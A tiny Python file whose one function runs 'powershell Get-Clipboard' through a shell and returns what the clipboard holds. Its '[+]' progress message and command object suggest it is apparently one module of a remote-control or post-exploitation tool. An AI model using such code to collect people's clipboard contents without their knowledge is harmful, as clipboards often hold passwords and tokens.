from subprocess import check_output, STDOUT

def getclipboard(command):
    command.progress = f"{OK} Getting clipboard data"

    result = check_output("powershell Get-Clipboard", shell=True, stderr=STDOUT).decode("iso-8859-1", errors="replace")

    return result

OK = "[+]"
